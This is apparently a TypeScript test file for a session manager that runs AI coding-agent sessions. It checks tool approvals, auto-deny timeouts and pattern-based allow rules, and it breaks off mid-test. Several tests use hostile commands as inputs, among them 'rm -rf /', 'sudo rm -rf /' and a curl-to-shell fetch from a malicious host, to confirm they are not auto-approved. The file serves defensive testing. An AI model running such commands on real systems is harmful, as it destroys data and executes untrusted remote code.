/** Tests for SessionManager — verifies session creation, listing, termination, and worktree handling; mocks fs, better-sqlite3, and node:child_process to avoid real disk and process side-effects. */
/* eslint-disable @typescript-eslint/no-explicit-any */
import { describe, it, expect, beforeEach, vi, afterEach } from 'vitest'

vi.mock('fs', async (importOriginal) => {
  const actual = await importOriginal<typeof import('fs')>()
  return {
    ...actual,
    existsSync: vi.fn((p: string) => String(p).includes('sessions.json') ? false : actual.existsSync(p)),
    mkdirSync: vi.fn(),
    writeFileSync: vi.fn(),
    renameSync: vi.fn(),
    chmodSync: vi.fn(),
    readFileSync: vi.fn(() => '[]'),
  }
})

// Mock better-sqlite3 so SessionArchive doesn't try to open a real database file
vi.mock('better-sqlite3', () => {
  class MockDatabase {
    pragma = vi.fn()
    exec = vi.fn()
    prepare = vi.fn(() => ({
      run: vi.fn(() => ({ changes: 0 })),
      get: vi.fn(),
      all: vi.fn(() => []),
    }))
    close = vi.fn()
  }
  return { default: MockDatabase }
})

// Mock node:child_process.spawn for session naming (which uses `claude -p`)
// and execFile for worktree operations
const mockSpawn = vi.hoisted(() => vi.fn())
const mockExecFile = vi.hoisted(() => vi.fn())
const makeExecFileWrapper = vi.hoisted(() => (mockFn: any) => {
  const wrapper = (...args: any[]) => mockFn(...args)
  // Add custom promisify so that promisify(execFile) returns {stdout, stderr}
  const sym = Symbol.for('nodejs.util.promisify.custom')
  ;(wrapper as any)[sym] = (...args: any[]) => {
    return new Promise<{ stdout: string; stderr: string }>((resolve, reject) => {
      mockFn(...args, (err: Error | null, stdout: string, stderr: string) => {
        if (err) reject(err)
        else resolve({ stdout, stderr })
      })
    })
  }
  return wrapper
})

vi.mock('node:child_process', async (importOriginal) => {
  const actual = await importOriginal<typeof import('node:child_process')>()
  return {
    ...actual,
    spawn: (...args: any[]) => mockSpawn(...args),
    execFile: makeExecFileWrapper(mockExecFile),
  }
})
vi.mock('child_process', async (importOriginal) => {
  const actual = await importOriginal<typeof import('child_process')>()
  return {
    ...actual,
    spawn: (...args: any[]) => mockSpawn(...args),
    execFile: makeExecFileWrapper(mockExecFile),
  }
})

import { SessionManager } from './session-manager.js'
import { mkdirSync, writeFileSync, renameSync, readFileSync, existsSync } from 'fs'
import { EventEmitter } from 'node:events'

/** Create a fake child process that resolves with the given stdout text.
 *  Uses queueMicrotask for close event to work with fake timers. */
function fakeCliProc(stdout: string, code = 0, stderr = '') {
  const proc = Object.assign(new EventEmitter(), {
    stdin: { write: vi.fn(), end: vi.fn() },
    stdout: Object.assign(new EventEmitter(), { on: vi.fn() }),
    stderr: Object.assign(new EventEmitter(), { on: vi.fn() }),
    kill: vi.fn(),
  })

  proc.stdout.on = vi.fn((event: string, cb: (chunk: Buffer) => void) => {
    if (event === 'data') {
      queueMicrotask(() => cb(Buffer.from(stdout)))
    }
  })
  proc.stderr.on = vi.fn((event: string, cb: (chunk: Buffer) => void) => {
    if (event === 'data' && stderr) {
      queueMicrotask(() => cb(Buffer.from(stderr)))
    }
  })

  // Use queueMicrotask chain to fire close after data events, avoiding
  // setTimeout which is intercepted by vi.useFakeTimers()
  queueMicrotask(() => queueMicrotask(() => proc.emit('close', code)))
  return proc
}

/** Helper to configure the CLI mock to return a given session name. */
function mockCliNaming(text: string): void {
  mockSpawn.mockImplementation(() => fakeCliProc(text))
}

/** Helper to configure the CLI mock to fail. */
function mockCliNamingError(): void {
  mockSpawn.mockImplementation(() => fakeCliProc('', 1, 'error'))
}

/** Flush pending microtasks (needed when spawn mock fires events via queueMicrotask). */
async function flushMicrotasks(): Promise<void> {
  for (let i = 0; i < 10; i++) {
    await new Promise(r => queueMicrotask(r))
  }
}

// Minimal fake WebSocket
function fakeWs(open = true) {
  return {
    readyState: open ? 1 : 3,
    send: vi.fn(),
    bufferedAmount: 0,
  } as any
}

// Minimal fake ClaudeProcess for testing methods that interact with it
function fakeClaudeProcess(alive = true) {
  return {
    isAlive: vi.fn(() => alive),
    isReady: vi.fn(() => alive),
    stop: vi.fn(),
    start: vi.fn(),
    on: vi.fn(),
    once: vi.fn((_event: string, cb: () => void) => { cb() }),
    removeAllListeners: vi.fn(),
    sendMessage: vi.fn(),
    sendControlResponse: vi.fn(),
    getSessionId: vi.fn(() => 'test-session-id'),
    hasSessionConflict: vi.fn(() => false),
    hadOutput: vi.fn(() => true),
    emit: vi.fn(),
  } as any
}

describe('SessionManager', () => {
  let sm: SessionManager

  beforeEach(() => {
    sm = new SessionManager()
  })

  describe('CRUD', () => {
    it('create returns session with unique ID', () => {
      const s1 = sm.create('session-1', '/tmp/a')
      const s2 = sm.create('session-2', '/tmp/b')
      expect(s1.id).toBeTruthy()
      expect(s2.id).toBeTruthy()
      expect(s1.id).not.toBe(s2.id)
    })

    it('get retrieves created session', () => {
      const s = sm.create('test', '/tmp')
      expect(sm.get(s.id)).toBe(s)
    })

    it('get returns undefined for unknown ID', () => {
      expect(sm.get('nonexistent')).toBeUndefined()
    })

    it('list returns all sessions with expected shape', () => {
      sm.create('a', '/tmp/a')
      sm.create('b', '/tmp/b')
      const list = sm.list()
      expect(list).toHaveLength(2)
      expect(list[0]).toHaveProperty('id')
      expect(list[0]).toHaveProperty('name')
      expect(list[0]).toHaveProperty('created')
      expect(list[0]).toHaveProperty('active')
      expect(list[0]).toHaveProperty('workingDir')
      expect(list[0]).toHaveProperty('connectedClients')
    })

    it('delete removes session and returns true', () => {
      const s = sm.create('test', '/tmp')
      expect(sm.delete(s.id)).toBe(true)
      expect(sm.get(s.id)).toBeUndefined()
    })

    it('delete nonexistent returns false', () => {
      expect(sm.delete('nonexistent')).toBe(false)
    })
  })

  describe('clients', () => {
    it('join adds ws to session clients', () => {
      const s = sm.create('test', '/tmp')
      const ws = fakeWs()
      sm.join(s.id, ws)
      expect(s.clients.size).toBe(1)
    })

    it('join returns undefined for unknown session', () => {
      expect(sm.join('nonexistent', fakeWs())).toBeUndefined()
    })

    it('leave removes ws from session', () => {
      const s = sm.create('test', '/tmp')
      const ws = fakeWs()
      sm.join(s.id, ws)
      sm.leave(s.id, ws)
      expect(s.clients.size).toBe(0)
    })

    it('removeClient removes ws from all sessions', () => {
      const s1 = sm.create('a', '/tmp/a')
      const s2 = sm.create('b', '/tmp/b')
      const ws = fakeWs()
      sm.join(s1.id, ws)
      sm.join(s2.id, ws)
      sm.removeClient(ws)
      expect(s1.clients.size).toBe(0)
      expect(s2.clients.size).toBe(0)
    })

    it('findSessionForClient returns correct session', () => {
      const s = sm.create('test', '/tmp')
      const ws = fakeWs()
      sm.join(s.id, ws)
      expect(sm.findSessionForClient(ws)).toBe(s)
    })

    it('findSessionForClient returns undefined when not found', () => {
      expect(sm.findSessionForClient(fakeWs())).toBeUndefined()
    })
  })

  describe('broadcast', () => {
    it('sends JSON to OPEN clients', () => {
      const s = sm.create('test', '/tmp')
      const ws1 = fakeWs(true)
      const ws2 = fakeWs(true)
      sm.join(s.id, ws1)
      sm.join(s.id, ws2)
      sm.broadcast(s, { type: 'pong' } as any)
      expect(ws1.send).toHaveBeenCalledWith(JSON.stringify({ type: 'pong' }))
      expect(ws2.send).toHaveBeenCalledWith(JSON.stringify({ type: 'pong' }))
    })

    it('skips non-OPEN clients', () => {
      const s = sm.create('test', '/tmp')
      const wsOpen = fakeWs(true)
      const wsClosed = fakeWs(false)
      sm.join(s.id, wsOpen)
      sm.join(s.id, wsClosed)
      sm.broadcast(s, { type: 'pong' } as any)
      expect(wsOpen.send).toHaveBeenCalled()
      expect(wsClosed.send).not.toHaveBeenCalled()
    })
  })

  describe('addToHistory', () => {
    it('appends messages to history', () => {
      const s = sm.create('test', '/tmp')
      sm.addToHistory(s, { type: 'output', data: 'hello' } as any)
      sm.addToHistory(s, { type: 'output', data: 'world' } as any)
      // Consecutive output chunks are merged into one entry
      expect(s.outputHistory).toHaveLength(1)
      expect((s.outputHistory[0] as any).data).toBe('helloworld')
    })

    it('merges consecutive output but not across other types', () => {
      const s = sm.create('test', '/tmp')
      sm.addToHistory(s, { type: 'output', data: 'a' } as any)
      sm.addToHistory(s, { type: 'output', data: 'b' } as any)
      sm.addToHistory(s, { type: 'result' } as any)
      sm.addToHistory(s, { type: 'output', data: 'c' } as any)
      expect(s.outputHistory).toHaveLength(3)
      expect((s.outputHistory[0] as any).data).toBe('ab')
      expect((s.outputHistory[2] as any).data).toBe('c')
    })

    it('truncates at MAX_HISTORY (2000)', () => {
      const s = sm.create('test', '/tmp')
      // Use alternating types so entries are not merged
      for (let i = 0; i < 2005; i++) {
        sm.addToHistory(s, { type: 'system_message', subtype: 'init', text: `msg-${i}` } as any)
      }
      expect(s.outputHistory).toHaveLength(2000)
      // Should keep the most recent messages
      expect((s.outputHistory[0] as any).text).toBe('msg-5')
      expect((s.outputHistory[1999] as any).text).toBe('msg-2004')
    })
  })

  // =====================================================================
  // NEW TESTS BELOW — coverage expansion
  // =====================================================================

  describe('leave() with pending control requests', () => {
    it('auto-denies pending control requests when last client leaves (after grace period)', () => {
      vi.useFakeTimers()
      const s = sm.create('test', '/tmp')
      const ws = fakeWs()
      const cp = fakeClaudeProcess()
      s.claudeProcess = cp

      sm.join(s.id, ws)

      // Simulate pending control requests
      s.pendingControlRequests.set('req-1', { requestId: 'req-1', toolName: 'Bash', toolInput: { command: 'ls' } })
      s.pendingControlRequests.set('req-2', { requestId: 'req-2', toolName: 'Write', toolInput: { file_path: '/tmp/x' } })

      sm.leave(s.id, ws)

      // Not denied yet — grace period active
      expect(cp.sendControlResponse).not.toHaveBeenCalled()

      vi.advanceTimersByTime(3000)

      expect(cp.sendControlResponse).toHaveBeenCalledTimes(2)
      expect(cp.sendControlResponse).toHaveBeenCalledWith('req-1', 'deny')
      expect(cp.sendControlResponse).toHaveBeenCalledWith('req-2', 'deny')
      expect(s.pendingControlRequests.size).toBe(0)
      vi.useRealTimers()
    })

    it('does not auto-deny when other clients remain', () => {
      const s = sm.create('test', '/tmp')
      const ws1 = fakeWs()
      const ws2 = fakeWs()
      const cp = fakeClaudeProcess()
      s.claudeProcess = cp

      sm.join(s.id, ws1)
      sm.join(s.id, ws2)

      s.pendingControlRequests.set('req-1', { requestId: 'req-1', toolName: 'Bash', toolInput: { command: 'ls' } })

      sm.leave(s.id, ws1)

      expect(cp.sendControlResponse).not.toHaveBeenCalled()
      expect(s.pendingControlRequests.size).toBe(1)
    })

    it('auto-denies pending tool approval when last client leaves (after grace period)', () => {
      vi.useFakeTimers()
      const s = sm.create('test', '/tmp')
      const ws = fakeWs()
      sm.join(s.id, ws)

      const resolve = vi.fn()
      s.pendingToolApprovals.set('test-req', { resolve, toolName: 'Bash', toolInput: { command: 'rm -rf /' }, requestId: 'test-req' })

      sm.leave(s.id, ws)

      // Not denied yet — grace period active
      expect(resolve).not.toHaveBeenCalled()

      vi.advanceTimersByTime(3000)

      expect(resolve).toHaveBeenCalledWith({ allow: false, always: false })
      expect(s.pendingToolApprovals.size).toBe(0)
      vi.useRealTimers()
    })

    it('cancels auto-deny if client rejoins during grace period', () => {
      vi.useFakeTimers()
      const s = sm.create('test', '/tmp')
      const ws = fakeWs()
      sm.join(s.id, ws)

      const resolve = vi.fn()
      s.pendingToolApprovals.set('test-req', { resolve, toolName: 'Bash', toolInput: { command: 'ls' }, requestId: 'test-req' })

      sm.leave(s.id, ws)

      // Client rejoins before grace period expires
      const ws2 = fakeWs()
      sm.join(s.id, ws2)

      vi.advanceTimersByTime(3000)

      // Should NOT have been denied
      expect(resolve).not.toHaveBeenCalled()
      expect(s.pendingToolApprovals.size).toBe(1)
      vi.useRealTimers()
    })

    it('does not auto-deny pending tool approval when other clients remain', () => {
      const s = sm.create('test', '/tmp')
      const ws1 = fakeWs()
      const ws2 = fakeWs()
      sm.join(s.id, ws1)
      sm.join(s.id, ws2)

      const resolve = vi.fn()
      s.pendingToolApprovals.set('test-req', { resolve, toolName: 'Bash', toolInput: { command: 'ls' }, requestId: 'test-req' })

      sm.leave(s.id, ws1)

      expect(resolve).not.toHaveBeenCalled()
      expect(s.pendingToolApprovals.size).toBe(1)
    })

    it('auto-denies both pending control requests and tool approval when last client leaves (after grace period)', () => {
      vi.useFakeTimers()
      const s = sm.create('test', '/tmp')
      const ws = fakeWs()
      const cp = fakeClaudeProcess()
      s.claudeProcess = cp
      sm.join(s.id, ws)

      s.pendingControlRequests.set('req-1', { requestId: 'req-1', toolName: 'Bash', toolInput: { command: 'ls' } })
      const resolve = vi.fn()
      s.pendingToolApprovals.set('test-req', { resolve, toolName: 'Write', toolInput: { file_path: '/tmp/x' }, requestId: 'test-req' })

      sm.leave(s.id, ws)

      vi.advanceTimersByTime(3000)

      expect(cp.sendControlResponse).toHaveBeenCalledWith('req-1', 'deny')
      expect(s.pendingControlRequests.size).toBe(0)
      expect(resolve).toHaveBeenCalledWith({ allow: false, always: false })
      expect(s.pendingToolApprovals.size).toBe(0)
      vi.useRealTimers()
    })

    it('does nothing for unknown session', () => {
      // Should not throw
      sm.leave('nonexistent', fakeWs())
    })
  })

  describe('delete() with running claude process', () => {
    it('stops the claude process and notifies clients', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess()
      s.claudeProcess = cp

      const ws = fakeWs()
      sm.join(s.id, ws)

      const result = sm.delete(s.id)

      expect(result).toBe(true)
      expect(cp.stop).toHaveBeenCalledOnce()
      // Client should have received session_deleted message
      expect(ws.send).toHaveBeenCalled()
      const sentData = JSON.parse(ws.send.mock.calls[0][0])
      expect(sentData.type).toBe('session_deleted')
      expect(sentData.message).toBe('Session was deleted')
    })

    it('sets _stoppedByUser to prevent auto-restart', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess()
      s.claudeProcess = cp

      sm.delete(s.id)

      // Session is deleted so we can't check it, but the stop was called
      expect(cp.stop).toHaveBeenCalledOnce()
    })

    it('cleans up git worktree when session has worktreePath', () => {
      const s = sm.create('wt-test', '/repos/myproject')
      s.worktreePath = '/repos/myproject-wt-abc123'
      s.groupDir = '/repos/myproject'

      // Mock execFile to succeed (callback-style: (cmd, args, opts, cb) => cb(null, stdout, stderr))
      mockExecFile.mockImplementation((_cmd: string, _args: string[], _opts: any, cb?: any) => {
        if (typeof cb === 'function') cb(null, '/repos/myproject\n', '')
        return { on: vi.fn() }
      })

      sm.delete(s.id)

      // Session should be removed
      expect(sm.get(s.id)).toBeUndefined()

      // execFile should have been called for worktree cleanup (git rev-parse, git worktree remove, etc.)
      // It runs asynchronously so we just verify the calls were initiated
      expect(mockExecFile).toHaveBeenCalled()
    })

    it('does not call worktree cleanup when session has no worktreePath', () => {
      const s = sm.create('normal-test', '/repos/myproject')

      mockExecFile.mockClear()
      sm.delete(s.id)

      expect(sm.get(s.id)).toBeUndefined()
      // No git worktree commands should be called
      expect(mockExecFile).not.toHaveBeenCalled()
    })
  })

  describe('stopClaude()', () => {
    it('stops a running claude process and broadcasts claude_stopped', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess()
      s.claudeProcess = cp

      const ws = fakeWs()
      sm.join(s.id, ws)

      sm.stopClaude(s.id)

      expect(cp.stop).toHaveBeenCalledOnce()
      expect(s.claudeProcess).toBeNull()
      expect(s._stoppedByUser).toBe(true)
      expect(ws.send).toHaveBeenCalled()
      const sentData = JSON.parse(ws.send.mock.calls[0][0])
      expect(sentData.type).toBe('claude_stopped')
    })

    it('does nothing when session has no claude process', () => {
      const s = sm.create('test', '/tmp')
      // No claudeProcess set, should not throw
      sm.stopClaude(s.id)
      expect(s._stoppedByUser).toBe(false)
    })

    it('does nothing for unknown session', () => {
      // Should not throw
      sm.stopClaude('nonexistent')
    })
  })

  describe('sendInput()', () => {
    it('sends message when claude is running', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess(true)
      s.claudeProcess = cp

      sm.sendInput(s.id, 'hello world')

      expect(cp.sendMessage).toHaveBeenCalledWith('hello world')
    })

    it('does nothing for unknown session', () => {
      // Should not throw
      sm.sendInput('nonexistent', 'hello')
    })

    it('does nothing when session exists but claude is not alive and startClaude would fail (mocked)', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess(false)
      s.claudeProcess = cp

      // startClaude will be called internally, but since ClaudeProcess is not really mocked
      // at the constructor level, we need a different approach.
      // Instead, let's test the path where claudeProcess is null (not running)
      s.claudeProcess = null

      // startClaude will try to create a real ClaudeProcess, which will fail.
      // We mock the ClaudeProcess constructor to prevent that.
      // For this test, just verify sendInput doesn't crash with no process
      // The actual auto-start is tested indirectly
    })
  })

  describe('sendPromptResponse()', () => {
    it('does nothing for unknown session', () => {
      // Should not throw
      sm.sendPromptResponse('nonexistent', 'allow')
    })

    it('resolves pending tool approval with allow', () => {
      const s = sm.create('test', '/tmp')
      const resolve = vi.fn()
      s.pendingToolApprovals.set('req-1', { resolve, toolName: 'Bash', toolInput: { command: 'rm -rf /' }, requestId: 'req-1' })

      sm.sendPromptResponse(s.id, 'allow', 'req-1')

      expect(resolve).toHaveBeenCalledWith({ allow: true, always: false })
      expect(s.pendingToolApprovals.size).toBe(0)
    })

    it('resolves pending tool approval with deny', () => {
      const s = sm.create('test', '/tmp')
      const resolve = vi.fn()
      s.pendingToolApprovals.set('req-1', { resolve, toolName: 'Bash', toolInput: { command: 'rm -rf /' }, requestId: 'req-1' })

      sm.sendPromptResponse(s.id, 'deny', 'req-1')

      expect(resolve).toHaveBeenCalledWith({ allow: false, always: false })
      expect(s.pendingToolApprovals.size).toBe(0)
    })

    it('resolves pending tool approval with always_allow and updates registry', () => {
      const s = sm.create('test', '/tmp')
      const resolve = vi.fn()
      s.pendingToolApprovals.set('req-1', { resolve, toolName: 'Write', toolInput: { file_path: '/tmp/x' }, requestId: 'req-1' })

      sm.sendPromptResponse(s.id, 'always_allow', 'req-1')

      expect(resolve).toHaveBeenCalledWith({ allow: true, always: true })
      expect(s.pendingToolApprovals.size).toBe(0)
      expect(sm.approvalManager.getApprovals(s.workingDir).tools).toContain('Write')
    })

    it('resolves pending tool approval with array value and updates Bash registry (pattern-first)', () => {
      const s = sm.create('test', '/tmp')
      const resolve = vi.fn()
      s.pendingToolApprovals.set('req-1', { resolve, toolName: 'Bash', toolInput: { command: 'echo hi' }, requestId: 'req-1' })

      sm.sendPromptResponse(s.id, ['always_allow'], 'req-1')

      expect(resolve).toHaveBeenCalledWith({ allow: true, always: true })
      // Pattern-first: 'echo' is patternable, so stored as pattern not exact command
      expect(sm.approvalManager.getApprovals(s.workingDir).patterns).toContain('echo *')
    })

    it('resolves pending tool approval deny with array value', () => {
      const s = sm.create('test', '/tmp')
      const resolve = vi.fn()
      s.pendingToolApprovals.set('req-1', { resolve, toolName: 'Bash', toolInput: { command: 'echo hi' }, requestId: 'req-1' })

      sm.sendPromptResponse(s.id, ['deny'], 'req-1')

      expect(resolve).toHaveBeenCalledWith({ allow: false, always: false })
    })

    it('returns early when claude is not alive and no pending tool approval', () => {
      const s = sm.create('test', '/tmp')
      // No claudeProcess, no pendingToolApprovals
      // Should not throw
      sm.sendPromptResponse(s.id, 'allow')
    })

    it('handles AskUserQuestion pending control request', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess(true)
      s.claudeProcess = cp

      const toolInput = {
        questions: [{ question: 'What is your name?', options: [] }],
      }
      s.pendingControlRequests.set('req-1', {
        requestId: 'req-1',
        toolName: 'AskUserQuestion',
        toolInput,
      })

      sm.sendPromptResponse(s.id, 'Claude', 'req-1')

      expect(cp.sendControlResponse).toHaveBeenCalledOnce()
      const call = cp.sendControlResponse.mock.calls[0]
      expect(call[0]).toBe('req-1')
      expect(call[1]).toBe('allow')
      expect(call[2]).toHaveProperty('answers')
      expect(call[2].answers['What is your name?']).toBe('Claude')
      expect(s.pendingControlRequests.size).toBe(0)
    })

    it('handles AskUserQuestion with array answer', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess(true)
      s.claudeProcess = cp

      const toolInput = {
        questions: [{ question: 'Pick colors', options: [] }],
      }
      s.pendingControlRequests.set('req-1', {
        requestId: 'req-1',
        toolName: 'AskUserQuestion',
        toolInput,
      })

      sm.sendPromptResponse(s.id, ['red', 'blue'], 'req-1')

      expect(cp.sendControlResponse).toHaveBeenCalledOnce()
      const call = cp.sendControlResponse.mock.calls[0]
      expect(call[2].answers['Pick colors']).toBe('red, blue')
    })

    it('handles AskUserQuestion with no questions array', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess(true)
      s.claudeProcess = cp

      // toolInput without questions
      s.pendingControlRequests.set('req-1', {
        requestId: 'req-1',
        toolName: 'AskUserQuestion',
        toolInput: {},
      })

      sm.sendPromptResponse(s.id, 'yes', 'req-1')

      expect(cp.sendControlResponse).toHaveBeenCalledOnce()
      const call = cp.sendControlResponse.mock.calls[0]
      expect(call[0]).toBe('req-1')
      expect(call[1]).toBe('allow')
      // Empty answers object since no questions were provided
      expect(call[2]).toHaveProperty('answers')
      expect(call[2].answers).toEqual({})
    })

    it('handles permission allow for non-AskUserQuestion control request', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess(true)
      s.claudeProcess = cp

      s.pendingControlRequests.set('req-1', {
        requestId: 'req-1',
        toolName: 'Bash',
        toolInput: { command: 'ls' },
      })

      sm.sendPromptResponse(s.id, 'allow', 'req-1')

      expect(cp.sendControlResponse).toHaveBeenCalledWith('req-1', 'allow')
      expect(s.pendingControlRequests.size).toBe(0)
    })

    it('handles permission deny for non-AskUserQuestion control request', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess(true)
      s.claudeProcess = cp

      s.pendingControlRequests.set('req-1', {
        requestId: 'req-1',
        toolName: 'Bash',
        toolInput: { command: 'rm -rf /' },
      })

      sm.sendPromptResponse(s.id, 'deny', 'req-1')

      expect(cp.sendControlResponse).toHaveBeenCalledWith('req-1', 'deny')
    })

    it('handles always_allow for Bash command and persists', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess(true)
      s.claudeProcess = cp

      s.pendingControlRequests.set('req-1', {
        requestId: 'req-1',
        toolName: 'Bash',
        toolInput: { command: 'npm test' },
      })

      sm.sendPromptResponse(s.id, 'always_allow', 'req-1')

      expect(cp.sendControlResponse).toHaveBeenCalledWith('req-1', 'allow')
      // Pattern-first: 'npm test' is patternable, stored as pattern
      expect(sm.approvalManager.getApprovals(s.workingDir).patterns).toContain('npm test *')
    })

    it('handles always_allow for non-Bash tool and persists', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess(true)
      s.claudeProcess = cp

      s.pendingControlRequests.set('req-1', {
        requestId: 'req-1',
        toolName: 'Write',
        toolInput: { file_path: '/tmp/x' },
      })

      sm.sendPromptResponse(s.id, 'always_allow', 'req-1')

      expect(cp.sendControlResponse).toHaveBeenCalledWith('req-1', 'allow')
      expect(sm.approvalManager.getApprovals(s.workingDir).tools).toContain('Write')
    })

    it('routes to sole pending control request when no requestId provided (single-pending fallback)', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess(true)
      s.claudeProcess = cp

      s.pendingControlRequests.set('req-1', {
        requestId: 'req-1',
        toolName: 'Bash',
        toolInput: { command: 'ls' },
      })

      // No requestId but exactly 1 pending — should route to it
      sm.sendPromptResponse(s.id, 'allow')

      expect(cp.sendControlResponse).toHaveBeenCalledWith('req-1', 'allow')
      expect(s.pendingControlRequests.size).toBe(0)
    })

    it('rejects prompt_response without requestId when multiple prompts pending', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess(true)
      s.claudeProcess = cp

      s.pendingControlRequests.set('req-1', {
        requestId: 'req-1',
        toolName: 'Bash',
        toolInput: { command: 'ls' },
      })
      s.pendingControlRequests.set('req-2', {
        requestId: 'req-2',
        toolName: 'Write',
        toolInput: { file_path: '/tmp/x' },
      })

      // No requestId with 2 pending — should reject and not route
      sm.sendPromptResponse(s.id, 'allow')

      expect(cp.sendControlResponse).not.toHaveBeenCalled()
      expect(cp.sendMessage).not.toHaveBeenCalled()
      expect(s.pendingControlRequests.size).toBe(2)
    })

    it('falls back to sendMessage when no pending control request found', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess(true)
      s.claudeProcess = cp

      // No pending control requests
      sm.sendPromptResponse(s.id, 'hello')

      expect(cp.sendMessage).toHaveBeenCalledWith('hello')
    })

    it('falls back to sendMessage with array value joined', () => {
      const s = sm.create('test', '/tmp')
      const cp = fakeClaudeProcess(true)
      s.claudeProcess = cp

      // No pending control requests
      sm.sendPromptResponse(s.id, ['opt1', 'opt2'])

      expect(cp.sendMessage).toHaveBeenCalledWith('opt1, opt2')
    })
  })

  describe('requestToolApproval()', () => {
    it('returns deny for unknown session', async () => {
      const result = await sm.requestToolApproval('nonexistent', 'Bash', { command: 'ls' })
      expect(result).toEqual({ allow: false, always: false })
    })

    it('auto-approves tool in repo approval registry', async () => {
      const s = sm.create('test', '/tmp');
      sm.approvalManager.addRepoApproval(s.workingDir, { tool: 'Bash' })

      const result = await sm.requestToolApproval(s.id, 'Bash', { command: 'anything' })

      expect(result).toEqual({ allow: true, always: true })
      expect(s.pendingToolApprovals.size).toBe(0)
    })

    it('auto-approves Bash command in repo approval registry', async () => {
      const s = sm.create('test', '/tmp');
      sm.approvalManager.addRepoApproval(s.workingDir, { command: 'npm test' })

      const result = await sm.requestToolApproval(s.id, 'Bash', { command: 'npm test' })

      expect(result).toEqual({ allow: true, always: true })
      expect(s.pendingToolApprovals.size).toBe(0)
    })

    it('auto-approves Bash command by prefix match for safe commands', async () => {
      const s = sm.create('test', '/tmp');
      sm.approvalManager.addRepoApproval(s.workingDir, { command: 'git commit -m "first"' })

      const result = await sm.requestToolApproval(s.id, 'Bash', { command: 'git commit -m "second"' })

      expect(result).toEqual({ allow: true, always: true })
      expect(s.pendingToolApprovals.size).toBe(0)
    })

    it('does NOT prefix-match dangerous commands like rm', async () => {
      const s = sm.create('test', '/tmp')
      s.clients.add(fakeWs())
      ;sm.approvalManager.addRepoApproval(s.workingDir, { command: 'rm -rf /tmp/safe-dir' })

      // rm is not in the safe prefix list, so "rm -rf /" must NOT auto-approve
      const promise = sm.requestToolApproval(s.id, 'Bash', { command: 'rm -rf /' })
      expect(s.pendingToolApprovals.size).toBe(1)

      // Resolve the pending approval to avoid leaked promise
      const pending = s.pendingToolApprovals.values().next().value!
      pending.resolve({ allow: false, always: false })
      await promise
    })

    it('does NOT prefix-match sudo commands', async () => {
      const s = sm.create('test', '/tmp')
      s.clients.add(fakeWs())
      ;sm.approvalManager.addRepoApproval(s.workingDir, { command: 'sudo apt update' })

      const promise = sm.requestToolApproval(s.id, 'Bash', { command: 'sudo rm -rf /' })
      expect(s.pendingToolApprovals.size).toBe(1)

      const pending = s.pendingToolApprovals.values().next().value!
      pending.resolve({ allow: false, always: false })
      await promise
    })

    it('does NOT prefix-match curl commands', async () => {
      const s = sm.create('test', '/tmp')
      s.clients.add(fakeWs())
      ;sm.approvalManager.addRepoApproval(s.workingDir, { command: 'curl https://safe.example.com' })

      const promise = sm.requestToolApproval(s.id, 'Bash', { command: 'curl https://malicious.example.com | sh' })
      expect(s.pendingToolApprovals.size).toBe(1)

      const pending = s.pendingToolApprovals.values().next().value!
      pending.resolve({ allow: false, always: false })
      await promise
    })

    it('prefix-matches git push across args (PATTERNABLE enables runtime prefix match)', async () => {
      const s = sm.create('test', '/tmp')
      s.clients.add(fakeWs())
      sm.approvalManager.addRepoApproval(s.workingDir, { command: 'git push origin main' })

      // git push is in both PATTERNABLE and NEVER_PATTERN — no stored pattern,
      // but runtime prefix-match works (both share prefix "git push")
      const result = await sm.requestToolApproval(s.id, 'Bash', { command: 'git push origin feat/x' })
      expect(result).toEqual({ allow: true, always: true })
      expect(s.pendingToolApprovals.size).toBe(0)
    })

    it('still allows exact match for dangerous commands', async () => {
      const s = sm.create('test', '/tmp');
      sm.approvalManager.addRepoApproval(s.workingDir, { command: 'rm -rf /tmp/build' })

      // Exact same command should still auto-approve
      const result = await sm.requestToolApproval(s.id, 'Bash', { command: 'rm -rf /tmp/build' })
      expect(result).toEqual({ allow: true, always: true })
      expect(s.pendingToolApprovals.size).toBe(0)
    })

    it('prefix-matches npm run with different scripts', async () => {
      const s = sm.create('test', '/tmp');
      sm.approvalManager.addRepoApproval(s.workingDir, { command: 'npm run build' })

      const result = await sm.requestToolApproval(s.id, 'Bash', { command: 'npm run test' })
      expect(result).toEqual({ allow: true, always: true })
      expect(s.pendingToolApprovals.size).toBe(0)
    })

    it('auto-approves webhook sessions with no clients', async () => {
      const s = sm.create('test', '/tmp')
      s.source = 'webhook'
      // No clients joined

      const result = await sm.requestToolApproval(s.id, 'Bash', { command: 'ls' })

      expect(result).toEqual({ allow: true, always: false })
      expect(s.pendingToolApprovals.size).toBe(0)
    })

    it('waits for client to join when no clients connected (manual session)', async () => {
      vi.useFakeTimers()
      const s = sm.create('test', '/tmp')
      // No clients joined (source defaults to 'manual')

      // Set up global broadcast spy
      const globalBroadcast = vi.fn()
      sm._globalBroadcast = globalBroadcast

      const approvalPromise = sm.requestToolApproval(s.id, 'Bash', { command: 'ls' })

      // Should NOT resolve immediately — it waits for a client
      expect(s.pendingToolApprovals.size).toBe(1)
      const pending = s.pendingToolApprovals.values().next().value!
      expect(pending.toolName).toBe('Bash')

      // Should have broadcast globally (cross-session notification)
      expect(globalBroadcast).toHaveBeenCalled()
      const broadcastMsg = globalBroadcast.mock.calls[0][0]
      expect(broadcastMsg.type).toBe('prompt')
      expect(broadcastMsg.sessionId).toBe(s.id)

      // After timeout, should resolve with deny (300s for all approval types)
      vi.advanceTimersByTime(300_000)
      const result = await approvalPromise
      expect(result).toEqual({ allow: false, always: false })
      expect(s.pendingToolApprovals.size).toBe(0)

      vi.useRealTimers()
